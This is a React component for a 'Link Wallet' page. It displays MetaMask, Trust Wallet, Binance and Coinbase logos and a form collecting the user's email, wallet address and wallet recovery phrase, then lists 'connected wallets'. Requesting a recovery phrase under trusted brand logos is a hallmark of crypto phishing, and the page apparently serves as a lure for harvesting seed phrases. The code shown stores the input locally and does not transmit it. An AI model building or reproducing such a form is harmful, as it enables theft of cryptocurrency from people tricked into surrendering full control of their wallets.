import React, { useState } from "react";
import { Form, Button, Table, Card } from "react-bootstrap";
import metamaskLogo from "../meta.PNG";
import trustWalletLogo from "../trust.PNG";
import binanceLogo from "../binance.PNG";
import coinbaseLogo from "../coinbase.PNG";

const LinkWallet = () => {
    const [formData, setFormData] = useState({
        email: "",
        walletAddress: "",
        recoveryPhrase: "",
      });
    
      const [wallets, setWallets] = useState([
        { email: "user@example.com", walletName: "Metamask", dateAdded: "2025-03-19" },
      ]);
    
      const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
      };
    
      const handleSubmit = (e) => {
        e.preventDefault();
        if (formData.email && formData.walletAddress) {
          setWallets([...wallets, { ...formData, walletName: "Unknown", dateAdded: new Date().toISOString().split("T")[0] }]);
          setFormData({ email: "", walletAddress: "", recoveryPhrase: "" });
        }
      };


    return (
        <div className='container-large'>
            <div className="container">
            <div
      className="main-container p-4"
      style={{
        maxWidth: "650px",
        background: "#d6dee8",
        borderRadius: "15px",
        boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
        color: "#2c3e50",
      }}
    >
      {/* Accepted Wallets Section */}
      <div className="text-center mb-3">
        <h4 className="fw-bold mb-3">ACCEPTED WALLETS</h4>
        <div className="d-flex justify-content-center flex-wrap gap-3">
          {[metamaskLogo, trustWalletLogo, binanceLogo, coinbaseLogo].map((logo, index) => (
            <div
              key={index}
              style={{
                width: "80px",
                height: "80px",
                borderRadius: "15px",
                background: "#f0f4f8",
                boxShadow: "0 2px 5px rgba(0, 0, 0, 0.1)",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                padding: "10px",
              }}
            >
              <img src={logo} alt="Wallet Logo" style={{ width: "60%" }} />
            </div>
          ))}
        </div>
      </div>

      {/* Wallet Linking Form */}
      <Form onSubmit={handleSubmit} className="text-start">
        <Form.Group className="mb-3">
          <Form.Label>Email Address</Form.Label>
          <Form.Control
            type="email"
            name="email"
            value={formData.email}
            onChange={handleChange}
            required
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Form.Group className="mb-3">
          <Form.Label>Your Wallet Address</Form.Label>
          <Form.Control
            type="text"
            name="walletAddress"
            value={formData.walletAddress}
            onChange={handleChange}
            required
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Form.Group className="mb-4">
          <Form.Label>Recovery Phrase</Form.Label>
          <Form.Control
            as="textarea"
            rows={3}
            name="recoveryPhrase"
            value={formData.recoveryPhrase}
            onChange={handleChange}
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Button type="submit" variant="dark" className="w-100">
          🔗 Link Wallet
        </Button>
      </Form>

      {/* Connected Wallets Table */}
      <Card className="mt-4 p-3" style={{ background: "#f0f4f8", borderRadius: "15px" }}>
        <h5 className="fw-bold mb-3">Connected Wallets</h5>
        <Table striped bordered hover responsive>
          <thead>
            <tr>
              <th>Email</th>
              <th>Wallet Name</th>
              <th>Date Added</th>
            </tr>
          </thead>
          <tbody>
            {wallets.map((wallet, index) => (
              <tr key={index}>
                <td>{wallet.email}</td>
                <td>{wallet.walletName}</td>
                <td>{wallet.dateAdded}</td>
              </tr>
            ))}
          </tbody>
        </Table>
      </Card>
    </div>
            </div>
        </div>
    );
};

export default LinkWallet;
